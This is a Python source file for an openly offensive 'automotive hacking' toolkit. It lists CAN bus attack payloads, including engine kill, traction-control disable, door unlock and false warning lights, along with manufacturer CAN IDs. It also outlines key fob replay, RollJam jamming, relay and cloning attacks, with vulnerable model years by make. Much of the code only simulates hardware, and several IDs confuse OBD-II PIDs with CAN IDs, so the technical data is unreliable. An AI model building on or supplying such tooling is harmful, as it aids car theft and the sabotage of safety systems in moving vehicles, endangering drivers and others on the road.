"""
Automotive & CAN Bus Hacking Module
=====================================
Vehicle exploitation toolkit for CAN Bus attacks and Keyless Entry bypass.

Targets: Modern vehicles with OBD-II ports and wireless key fobs.

WARNING: Unauthorized vehicle hacking is illegal and dangerous.
Only use on vehicles you own or have explicit permission to test.

Author: ITherso
Version: 1.0.0
"""

import struct
import socket
import threading
import time
import json
import os
import hashlib
import random
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple
from dataclasses import dataclass, field, asdict
from enum import Enum
import logging

logger = logging.getLogger(__name__)


# =============================================================================
# ENUMS & CONSTANTS
# =============================================================================

class CANMessageType(Enum):
    """CAN Bus message types"""
    ENGINE = "engine"
    TRANSMISSION = "transmission"
    BRAKES = "brakes"
    STEERING = "steering"
    AIRBAGS = "airbags"
    DOORS = "doors"
    WINDOWS = "windows"
    LIGHTS = "lights"
    DASHBOARD = "dashboard"
    RADIO = "radio"
    CLIMATE = "climate"
    IMMOBILIZER = "immobilizer"


class VehicleMake(Enum):
    """Known vehicle manufacturers"""
    TOYOTA = "toyota"
    HONDA = "honda"
    FORD = "ford"
    CHEVROLET = "chevrolet"
    BMW = "bmw"
    MERCEDES = "mercedes"
    AUDI = "audi"
    VOLKSWAGEN = "volkswagen"
    NISSAN = "nissan"
    HYUNDAI = "hyundai"
    KIA = "kia"
    TESLA = "tesla"
    JEEP = "jeep"
    DODGE = "dodge"
    SUBARU = "subaru"


class OBDProtocol(Enum):
    """OBD-II Protocols"""
    ISO_9141 = ("iso_9141", "ISO 9141-2")
    ISO_14230 = ("iso_14230", "ISO 14230-4 (KWP2000)")
    ISO_15765 = ("iso_15765", "ISO 15765-4 (CAN)")
    SAE_J1850_PWM = ("j1850_pwm", "SAE J1850 PWM")
    SAE_J1850_VPW = ("j1850_vpw", "SAE J1850 VPW")


class KeyFobFrequency(Enum):
    """Common key fob frequencies"""
    FREQ_315MHZ = (315.0, "315 MHz (US/Japan)")
    FREQ_433MHZ = (433.92, "433.92 MHz (Europe)")
    FREQ_868MHZ = (868.0, "868 MHz (Europe)")
    FREQ_125KHZ = (0.125, "125 kHz (RFID/Immobilizer)")


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class CANFrame:
    """CAN Bus frame structure"""
    arbitration_id: int
    data: bytes
    is_extended: bool = False
    is_remote: bool = False
    timestamp: datetime = field(default_factory=datetime.now)
    
    def to_hex(self) -> str:
        """Convert to hex string"""
        return f"{self.arbitration_id:03X}#{self.data.hex().upper()}"
    
    @classmethod
    def from_hex(cls, hex_str: str) -> 'CANFrame':
        """Parse from hex string (ID#DATA)"""
        parts = hex_str.split('#')
        arb_id = int(parts[0], 16)
        data = bytes.fromhex(parts[1]) if len(parts) > 1 else b''
        return cls(arbitration_id=arb_id, data=data)


@dataclass
class VehicleProfile:
    """Vehicle CAN Bus profile"""
    make: str
    model: str
    year: int
    protocol: str = "CAN"
    can_ids: Dict[str, int] = field(default_factory=dict)
    discovered_at: datetime = field(default_factory=datetime.now)
    notes: str = ""


@dataclass 
class KeyFobSignal:
    """Captured key fob signal"""
    signal_id: str
    frequency: float
    modulation: str
    raw_data: bytes
    timestamp: datetime = field(default_factory=datetime.now)
    is_rolling_code: bool = False
    vehicle_make: Optional[str] = None
    signal_type: str = "unknown"  # lock, unlock, panic, trunk


@dataclass
class CANAttack:
    """Active CAN Bus attack"""
    attack_id: str
    attack_type: str
    target_id: int
    payload: bytes
    started_at: datetime = field(default_factory=datetime.now)
    is_active: bool = True
    success: bool = False


# =============================================================================
# CAN BUS KILL SWITCH
# =============================================================================

class CANBusKillSwitch:
    """
    CAN Bus Attack Module
    
    Connects to vehicle's CAN Bus via OBD-II port and sends
    malicious frames to control vehicle systems.
    """
    
    # Common CAN IDs (vary by manufacturer)
    COMMON_CAN_IDS = {
        "engine_rpm": 0x0C,
        "vehicle_speed": 0x0D,
        "throttle_position": 0x11,
        "engine_coolant_temp": 0x05,
        "fuel_level": 0x2F,
        "odometer": 0xA6,
        "doors": 0x405,
        "windows": 0x410,
        "lights": 0x420,
        "horn": 0x430,
        "dashboard": 0x440,
        "airbag": 0x450,
        "steering": 0x460,
        "brakes": 0x470,
        "transmission": 0x480,
        "radio": 0x490,
        "climate": 0x4A0,
        "immobilizer": 0x4B0,
    }
    
    # Manufacturer-specific CAN IDs
    MANUFACTURER_CAN_IDS = {
        "toyota": {
            "doors": 0x750,
            "engine": 0x7E0,
            "dashboard": 0x620,
            "steering": 0x260,
        },
        "honda": {
            "doors": 0x17C,
            "engine": 0x158,
            "dashboard": 0x324,
            "immobilizer": 0x294,
        },
        "ford": {
            "doors": 0x433,
            "engine": 0x7E0,
            "dashboard": 0x430,
            "bcm": 0x726,
        },
        "bmw": {
            "doors": 0x2FC,
            "engine": 0x7E0,
            "dashboard": 0x5F0,
            "comfort": 0x2CA,
        },
        "volkswagen": {
            "doors": 0x381,
            "engine": 0x7E0,
            "dashboard": 0x320,
            "gateway": 0x714,
        },
        "tesla": {
            "doors": 0x3E2,
            "autopilot": 0x399,
            "battery": 0x352,
            "drive_unit": 0x108,
        },
        "jeep": {
            "doors": 0x2D0,
            "engine": 0x7E0,
            "uconnect": 0x2DF,
            "tipm": 0x641,
        }
    }
    
    # Attack payloads
    ATTACK_PAYLOADS = {
        "check_engine_light": {
            "name": "Check Engine Light",
            "description": "Turn on MIL (Malfunction Indicator Lamp)",
            "can_id": 0x7E0,
            "payload": bytes([0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "🔧"
        },
        "speedometer_max": {
            "name": "Speedometer Max",
            "description": "Spike speedometer to max reading",
            "can_id": 0x440,
            "payload": bytes([0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "🏎️"
        },
        "rpm_redline": {
            "name": "RPM Redline",
            "description": "Show RPM at redline on dashboard",
            "can_id": 0x440,
            "payload": bytes([0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00]),
            "icon": "⚡"
        },
        "door_unlock": {
            "name": "Unlock All Doors",
            "description": "Send door unlock signal",
            "can_id": 0x405,
            "payload": bytes([0x00, 0x0F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "🔓"
        },
        "door_lock": {
            "name": "Lock All Doors",
            "description": "Send door lock signal",
            "can_id": 0x405,
            "payload": bytes([0x00, 0xF0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "🔒"
        },
        "windows_down": {
            "name": "All Windows Down",
            "description": "Roll down all windows",
            "can_id": 0x410,
            "payload": bytes([0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "⬇️"
        },
        "windows_up": {
            "name": "All Windows Up",
            "description": "Roll up all windows",
            "can_id": 0x410,
            "payload": bytes([0x00, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "⬆️"
        },
        "horn_honk": {
            "name": "Horn Honk",
            "description": "Activate horn",
            "can_id": 0x430,
            "payload": bytes([0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "📯"
        },
        "lights_flash": {
            "name": "Flash Lights",
            "description": "Flash all exterior lights",
            "can_id": 0x420,
            "payload": bytes([0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "💡"
        },
        "radio_max_volume": {
            "name": "Radio Max Volume",
            "description": "Set radio volume to maximum",
            "can_id": 0x490,
            "payload": bytes([0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "🔊"
        },
        "ac_max_cold": {
            "name": "A/C Max Cold",
            "description": "Set climate to maximum cold",
            "can_id": 0x4A0,
            "payload": bytes([0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "❄️"
        },
        "panic_alarm": {
            "name": "Panic Alarm",
            "description": "Trigger vehicle panic alarm",
            "can_id": 0x405,
            "payload": bytes([0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "🚨"
        },
        "airbag_light": {
            "name": "Airbag Warning",
            "description": "Turn on airbag warning light",
            "can_id": 0x450,
            "payload": bytes([0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "🎈"
        },
        "abs_warning": {
            "name": "ABS Warning",
            "description": "Turn on ABS warning light",
            "can_id": 0x470,
            "payload": bytes([0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "⚠️"
        },
        "disable_traction": {
            "name": "Disable Traction Control",
            "description": "Turn off traction/stability control",
            "can_id": 0x470,
            "payload": bytes([0x00, 0x00, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "🛞"
        },
        "kill_engine": {
            "name": "Kill Engine",
            "description": "Send engine stop signal (DANGEROUS!)",
            "can_id": 0x7E0,
            "payload": bytes([0x02, 0x10, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00]),
            "icon": "💀"
        }
    }
    
    def __init__(self):
        self.connected = False
        self.interface = None
        self.vehicle_profile: Optional[VehicleProfile] = None
        self.captured_frames: List[CANFrame] = []
        self.active_attacks: List[CANAttack] = []
        self.is_sniffing = False
        self.sniff_thread = None
        
    def connect_obd(self, interface: str = "can0") -> Dict[str, Any]:
        """
        Connect to vehicle via OBD-II adapter
        
        Args:
            interface: CAN interface (can0, vcan0, slcan0, etc.)
        """
        try:
            # In real scenario, would use python-can library
            # sock = socket.socket(socket.AF_CAN, socket.SOCK_RAW, socket.CAN_RAW)
            # sock.bind((interface,))
            
            self.interface = interface
            self.connected = True
            
            logger.info(f"Connected to CAN interface: {interface}")
            
            return {
                "success": True,
                "interface": interface,
                "status": "connected",
                "message": f"Connected to {interface}"
            }
            
        except Exception as e:
            logger.error(f"OBD connection error: {e}")
            return {
                "success": False,
                "error": str(e)
            }
    
    def disconnect(self) -> bool:
        """Disconnect from CAN interface"""
        self.connected = False
        self.interface = None
        self.is_sniffing = False
        return True
    
    def detect_vehicle(self) -> Optional[VehicleProfile]:
        """
        Auto-detect vehicle make/model from CAN traffic
        """
        if not self.connected:
            return None
        
        # Simulate vehicle detection
        # In real scenario, would analyze CAN traffic patterns
        
        makes = list(VehicleMake)
        detected_make = random.choice(makes).value
        
        models = {
            "toyota": ["Camry", "Corolla", "RAV4", "Highlander"],
            "honda": ["Civic", "Accord", "CR-V", "Pilot"],
            "ford": ["F-150", "Mustang", "Explorer", "Escape"],
            "bmw": ["3 Series", "5 Series", "X3", "X5"],
            "tesla": ["Model S", "Model 3", "Model X", "Model Y"],
        }
        
        model_list = models.get(detected_make, ["Unknown"])
        detected_model = random.choice(model_list)
        
        profile = VehicleProfile(
            make=detected_make,
            model=detected_model,
            year=random.randint(2015, 2024),
            protocol="CAN 11-bit",
            can_ids=self.MANUFACTURER_CAN_IDS.get(detected_make, self.COMMON_CAN_IDS)
        )
        
        self.vehicle_profile = profile
        return profile
    
    def start_sniffing(self, filter_ids: List[int] = None) -> Dict[str, Any]:
        """
        Start sniffing CAN traffic
        
        Args:
            filter_ids: Optional list of CAN IDs to filter
        """
        if not self.connected:
            return {"success": False, "error": "Not connected to CAN interface"}
        
        self.is_sniffing = True
        self.captured_frames = []
        
        def sniff_loop():
            while self.is_sniffing:
                # Simulate captured frames
                frame = CANFrame(
                    arbitration_id=random.choice(list(self.COMMON_CAN_IDS.values())),
                    data=bytes([random.randint(0, 255) for _ in range(8)])
                )
                
                if filter_ids is None or frame.arbitration_id in filter_ids:
                    self.captured_frames.append(frame)
                
                time.sleep(0.01)  # ~100 frames/sec
        
        self.sniff_thread = threading.Thread(target=sniff_loop, daemon=True)
        self.sniff_thread.start()
        
        return {
            "success": True,
            "status": "sniffing",
            "filter": filter_ids
        }
    
    def stop_sniffing(self) -> Dict[str, Any]:
        """Stop CAN sniffing"""
        self.is_sniffing = False
        
        return {
            "success": True,
            "frames_captured": len(self.captured_frames)
        }
    
    def get_captured_frames(self, limit: int = 100) -> List[Dict]:
        """Get captured CAN frames"""
        frames = self.captured_frames[-limit:]
        return [
            {
                "id": f"0x{f.arbitration_id:03X}",
                "data": f.data.hex().upper(),
                "hex": f.to_hex(),
                "timestamp": f.timestamp.isoformat()
            }
            for f in frames
        ]
    
    def send_frame(self, can_id: int, data: bytes) -> Dict[str, Any]:
        """
        Send a CAN frame
        
        Args:
            can_id: CAN arbitration ID
            data: 8 bytes of data
        """
        if not self.connected:
            return {"success": False, "error": "Not connected"}
        
        frame = CANFrame(
            arbitration_id=can_id,
            data=data[:8].ljust(8, b'\x00')
        )
        
        # In real scenario, would send via socket
        logger.info(f"Sent CAN frame: {frame.to_hex()}")
        
        return {
            "success": True,
            "frame": frame.to_hex(),
            "can_id": f"0x{can_id:03X}",
            "data": data.hex().upper()
        }
    
    def execute_attack(self, attack_name: str) -> Dict[str, Any]:
        """
        Execute a predefined CAN attack
        
        Args:
            attack_name: Name of the attack from ATTACK_PAYLOADS
        """
        if attack_name not in self.ATTACK_PAYLOADS:
            return {"success": False, "error": f"Unknown attack: {attack_name}"}
        
        if not self.connected:
            return {"success": False, "error": "Not connected to CAN interface"}
        
        attack = self.ATTACK_PAYLOADS[attack_name]
        
        # Get manufacturer-specific CAN ID if available
        can_id = attack["can_id"]
        if self.vehicle_profile:
            mfr_ids = self.MANUFACTURER_CAN_IDS.get(self.vehicle_profile.make, {})
            # Try to find matching ID category
            for key in ["doors", "engine", "dashboard"]:
                if key in attack_name.lower() and key in mfr_ids:
                    can_id = mfr_ids[key]
                    break
        
        # Create attack record
        attack_id = hashlib.md5(f"{attack_name}{time.time()}".encode()).hexdigest()[:12]
        attack_record = CANAttack(
            attack_id=attack_id,
            attack_type=attack_name,
            target_id=can_id,
            payload=attack["payload"],
            is_active=True
        )
        self.active_attacks.append(attack_record)
        
        # Send the attack frame
        result = self.send_frame(can_id, attack["payload"])
        
        attack_record.success = result["success"]
        
        return {
            "success": True,
            "attack_id": attack_id,
            "attack_name": attack["name"],
            "description": attack["description"],
            "can_id": f"0x{can_id:03X}",
            "payload": attack["payload"].hex().upper(),
            "icon": attack["icon"],
            "warning": "⚠️ Attack sent to vehicle CAN Bus!"
        }
    
    def get_available_attacks(self) -> Dict[str, Dict]:
        """Get all available CAN attacks"""
        return self.ATTACK_PAYLOADS
    
    def get_status(self) -> Dict[str, Any]:
        """Get module status"""
        return {
            "connected": self.connected,
            "interface": self.interface,
            "vehicle": asdict(self.vehicle_profile) if self.vehicle_profile else None,
            "is_sniffing": self.is_sniffing,
            "frames_captured": len(self.captured_frames),
            "active_attacks": len([a for a in self.active_attacks if a.is_active])
        }


# =============================================================================
# KEYLESS ENTRY REPLAY ATTACK
# =============================================================================

class KeylessEntryReplay:
    """
    Keyless Entry Replay Attack Module
    
    Uses SDR (Software Defined Radio) to capture and replay
    key fob signals for vehicle entry.
    """
    
    # Known key fob characteristics
    KEY_FOB_PROFILES = {
        "toyota": {
            "frequency": 315.0,
            "modulation": "ASK",
            "rolling_code": True,
            "protocol": "KeeLoq",
            "vulnerable_years": "2010-2017"
        },
        "honda": {
            "frequency": 315.0,
            "modulation": "ASK",
            "rolling_code": True,
            "protocol": "KeeLoq",
            "vulnerable_years": "2012-2018"
        },
        "ford": {
            "frequency": 315.0,
            "modulation": "ASK",
            "rolling_code": True,
            "protocol": "Hitag2",
            "vulnerable_years": "2011-2016"
        },
        "bmw": {
            "frequency": 433.92,
            "modulation": "FSK",
            "rolling_code": True,
            "protocol": "BMW Remote",
            "vulnerable_years": "2010-2018"
        },
        "volkswagen": {
            "frequency": 433.92,
            "modulation": "ASK",
            "rolling_code": True,
            "protocol": "Megamos",
            "vulnerable_years": "2008-2019"
        },
        "tesla": {
            "frequency": 433.92,
            "modulation": "FSK",
            "rolling_code": False,
            "protocol": "Passive Entry",
            "vulnerable_years": "2017-2019"
        },
        "jeep": {
            "frequency": 315.0,
            "modulation": "ASK",
            "rolling_code": False,
            "protocol": "Fixed Code",
            "vulnerable_years": "2007-2017"
        },
        "kia_hyundai": {
            "frequency": 433.92,
            "modulation": "ASK",
            "rolling_code": False,
            "protocol": "Fixed Code",
            "vulnerable_years": "2011-2022"
        }
    }
    
    # Attack techniques
    ATTACK_TECHNIQUES = {
        "simple_replay": {
            "name": "Simple Replay",
            "description": "Record and replay signal (works on non-rolling code systems)",
            "difficulty": "Easy",
            "equipment": "RTL-SDR + HackRF",
            "success_rate": "High (if no rolling code)"
        },
        "rolljam": {
            "name": "RollJam Attack",
            "description": "Jam + capture two codes, replay first while jamming",
            "difficulty": "Medium",
            "equipment": "2x HackRF or YARD Stick One",
            "success_rate": "Medium-High"
        },
        "relay_attack": {
            "name": "Relay Attack",
            "description": "Extend range of passive entry by relaying signal",
            "difficulty": "Medium",
            "equipment": "2x Proxmark3 or custom relay",
            "success_rate": "Very High"
        },
        "cryptanalysis": {
            "name": "Cryptanalysis",
            "description": "Break weak crypto (KeeLoq, Hitag2, Megamos)",
            "difficulty": "Hard",
            "equipment": "Proxmark3 + Custom firmware",
            "success_rate": "High (if vulnerable)"
        },
        "emulator": {
            "name": "Key Emulation",
            "description": "Clone key fob after extracting crypto keys",
            "difficulty": "Expert",
            "equipment": "Flipper Zero / Proxmark3",
            "success_rate": "Very High (if keys extracted)"
        }
    }
    
    def __init__(self):
        self.sdr_connected = False
        self.sdr_device = None
        self.captured_signals: List[KeyFobSignal] = []
        self.is_listening = False
        self.jammer_active = False
        self.target_frequency = 315.0
        
    def connect_sdr(self, device: str = "hackrf") -> Dict[str, Any]:
        """
        Connect to SDR device
        
        Args:
            device: SDR device type (hackrf, rtlsdr, yardstick, flipper)
        """
        supported = ["hackrf", "rtlsdr", "yardstick", "flipper", "proxmark3"]
        
        if device.lower() not in supported:
            return {"success": False, "error": f"Unsupported device. Use: {supported}"}
        
        # Simulate SDR connection
        self.sdr_connected = True
        self.sdr_device = device
        
        return {
            "success": True,
            "device": device,
            "status": "connected",
            "capabilities": self._get_device_capabilities(device)
        }
    
    def _get_device_capabilities(self, device: str) -> Dict[str, Any]:
        """Get SDR device capabilities"""
        capabilities = {
            "hackrf": {
                "rx_freq": "1 MHz - 6 GHz",
                "tx_freq": "1 MHz - 6 GHz",
                "can_transmit": True,
                "can_jam": True
            },
            "rtlsdr": {
                "rx_freq": "24 MHz - 1.7 GHz",
                "tx_freq": None,
                "can_transmit": False,
                "can_jam": False
            },
            "yardstick": {
                "rx_freq": "300-348 MHz, 391-464 MHz, 782-928 MHz",
                "tx_freq": "Same as RX",
                "can_transmit": True,
                "can_jam": True
            },
            "flipper": {
                "rx_freq": "300-928 MHz + 125 kHz RFID",
                "tx_freq": "Same as RX",
                "can_transmit": True,
                "can_jam": False
            },
            "proxmark3": {
                "rx_freq": "125 kHz, 13.56 MHz",
                "tx_freq": "Same as RX",
                "can_transmit": True,
                "can_jam": False
            }
        }
        return capabilities.get(device, {})
    
    def set_frequency(self, frequency: float) -> Dict[str, Any]:
        """Set target frequency in MHz"""
        if not self.sdr_connected:
            return {"success": False, "error": "SDR not connected"}
        
        self.target_frequency = frequency
        
        return {
            "success": True,
            "frequency": f"{frequency} MHz",
            "common_uses": self._get_frequency_uses(frequency)
        }
    
    def _get_frequency_uses(self, freq: float) -> str:
        """Get common uses for a frequency"""
        uses = {
            315.0: "US/Japan key fobs, garage doors",
            433.92: "European key fobs, IoT devices",
            868.0: "European garage doors, IoT",
            125.0: "RFID/Immobilizer proximity",
            13.56: "NFC/HF RFID"
        }
        
        for f, use in uses.items():
            if abs(freq - f) < 1.0:
                return use
        return "Unknown"
    
    def start_listening(self) -> Dict[str, Any]:
        """Start listening for key fob signals"""
        if not self.sdr_connected:
            return {"success": False, "error": "SDR not connected"}
        
        self.is_listening = True
        
        return {
            "success": True,
            "status": "listening",
            "frequency": f"{self.target_frequency} MHz",
            "instruction": "Press key fob button near antenna to capture signal"
        }
    
    def stop_listening(self) -> Dict[str, Any]:
        """Stop listening"""
        self.is_listening = False
        return {
            "success": True,
            "signals_captured": len(self.captured_signals)
        }
    
    def capture_signal(self, signal_type: str = "unlock") -> Dict[str, Any]:
        """
        Capture a key fob signal
        
        Args:
            signal_type: lock, unlock, panic, trunk
        """
        if not self.is_listening:
            return {"success": False, "error": "Not listening. Start listening first."}
        
        # Simulate signal capture
        signal_id = hashlib.md5(f"signal{time.time()}".encode()).hexdigest()[:12]
        
        # Generate fake signal data
        raw_data = bytes([random.randint(0, 255) for _ in range(64)])
        
        signal = KeyFobSignal(
            signal_id=signal_id,
            frequency=self.target_frequency,
            modulation="ASK" if self.target_frequency < 400 else "FSK",
            raw_data=raw_data,
            is_rolling_code=random.choice([True, False]),
            signal_type=signal_type
        )
        
        self.captured_signals.append(signal)
        
        return {
            "success": True,
            "signal_id": signal_id,
            "frequency": f"{self.target_frequency} MHz",
            "modulation": signal.modulation,
            "is_rolling_code": signal.is_rolling_code,
            "signal_type": signal_type,
            "data_length": len(raw_data),
            "timestamp": signal.timestamp.isoformat(),
            "warning": "🔴 Rolling code detected!" if signal.is_rolling_code else "✅ Fixed code - replayable!"
        }
    
    def replay_signal(self, signal_id: str) -> Dict[str, Any]:
        """
        Replay a captured signal
        
        Args:
            signal_id: ID of captured signal to replay
        """
        if not self.sdr_connected:
            return {"success": False, "error": "SDR not connected"}
        
        # Check if device can transmit
        caps = self._get_device_capabilities(self.sdr_device)
        if not caps.get("can_transmit"):
            return {"success": False, "error": f"{self.sdr_device} cannot transmit"}
        
        # Find signal
        signal = next((s for s in self.captured_signals if s.signal_id == signal_id), None)
        if not signal:
            return {"success": False, "error": "Signal not found"}
        
        # Check if rolling code
        if signal.is_rolling_code:
            return {
                "success": False,
                "error": "Cannot replay rolling code signal",
                "suggestion": "Use RollJam attack or Relay attack instead"
            }
        
        return {
            "success": True,
            "signal_id": signal_id,
            "frequency": f"{signal.frequency} MHz",
            "status": "Signal transmitted!",
            "signal_type": signal.signal_type,
            "warning": "⚠️ If vehicle nearby, doors should respond!"
        }
    
    def start_jammer(self, duration: int = 30) -> Dict[str, Any]:
        """
        Start jamming at target frequency (for RollJam attack)
        
        Args:
            duration: Jam duration in seconds
        """
        if not self.sdr_connected:
            return {"success": False, "error": "SDR not connected"}
        
        caps = self._get_device_capabilities(self.sdr_device)
        if not caps.get("can_jam"):
            return {"success": False, "error": f"{self.sdr_device} cannot jam"}
        
        self.jammer_active = True
        
        # Auto-stop after duration
        def stop_jam():
            time.sleep(duration)
            self.jammer_active = False
        
        threading.Thread(target=stop_jam, daemon=True).start()
        
        return {
            "success": True,
            "status": "jamming",
            "frequency": f"{self.target_frequency} MHz",
            "duration": duration,
            "warning": "🚨 JAMMING ACTIVE - Capture signals while owner tries to lock!"
        }
    
    def stop_jammer(self) -> Dict[str, Any]:
        """Stop jamming"""
        self.jammer_active = False
        return {"success": True, "status": "jammer stopped"}
    
    def get_captured_signals(self) -> List[Dict]:
        """Get all captured signals"""
        return [
            {
                "signal_id": s.signal_id,
                "frequency": f"{s.frequency} MHz",
                "modulation": s.modulation,
                "is_rolling_code": s.is_rolling_code,
                "signal_type": s.signal_type,
                "timestamp": s.timestamp.isoformat(),
                "replayable": not s.is_rolling_code
            }
            for s in self.captured_signals
        ]
    
    def get_attack_techniques(self) -> Dict[str, Dict]:
        """Get available attack techniques"""
        return self.ATTACK_TECHNIQUES
    
    def get_vehicle_profiles(self) -> Dict[str, Dict]:
        """Get known vehicle key fob profiles"""
        return self.KEY_FOB_PROFILES
    
    def get_status(self) -> Dict[str, Any]:
        """Get module status"""
        return {
            "sdr_connected": self.sdr_connected,
            "sdr_device": self.sdr_device,
            "is_listening": self.is_listening,
            "jammer_active": self.jammer_active,
            "target_frequency": f"{self.target_frequency} MHz",
            "signals_captured": len(self.captured_signals)
        }


# =============================================================================
# MAIN AUTOMOTIVE HACKING CLASS
# =============================================================================

class AutomotiveHacker:
    """
    Main Automotive Hacking Module
    
    Combines CAN Bus attacks and Keyless Entry exploits.
    """
    
    def __init__(self):
        self.can_bus = CANBusKillSwitch()
        self.keyless = KeylessEntryReplay()
        
    def get_status(self) -> Dict[str, Any]:
        """Get overall module status"""
        return {
            "module": "Automotive & CAN Bus Hacking",
            "version": "1.0.0",
            "can_bus": self.can_bus.get_status(),
            "keyless": self.keyless.get_status(),
            "warning": "⚠️ VEHICLE HACKING IS EXTREMELY DANGEROUS AND ILLEGAL WITHOUT PERMISSION!"
        }
    
    def get_vehicle_makes(self) -> List[str]:
        """Get list of known vehicle makes"""
        return [v.value for v in VehicleMake]
    
    def get_obd_protocols(self) -> List[Dict]:
        """Get list of OBD protocols"""
        return [
            {"id": p.value[0], "name": p.value[1]}
            for p in OBDProtocol
        ]


# =============================================================================
# FACTORY FUNCTION
# =============================================================================

_instance: Optional[AutomotiveHacker] = None

def get_automotive_hacker() -> AutomotiveHacker:
    """Get or create the Automotive Hacker instance"""
    global _instance
    if _instance is None:
        _instance = AutomotiveHacker()
    return _instance


# =============================================================================
# CLI INTERFACE
# =============================================================================

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Automotive & CAN Bus Hacking Tool")
    parser.add_argument("--can-interface", default="vcan0", help="CAN interface")
    parser.add_argument("--sdr-device", default="hackrf", help="SDR device")
    parser.add_argument("--frequency", type=float, default=315.0, help="Target frequency (MHz)")
    
    args = parser.parse_args()
    
    hacker = get_automotive_hacker()
    
    print("🚗 Automotive Hacker v1.0")
    print("=" * 50)
    print(f"CAN Interface: {args.can_interface}")
    print(f"SDR Device: {args.sdr_device}")
    print(f"Frequency: {args.frequency} MHz")
    print()
    print("Available CAN Attacks:")
    for name, attack in hacker.can_bus.ATTACK_PAYLOADS.items():
        print(f"  {attack['icon']} {attack['name']}: {attack['description']}")
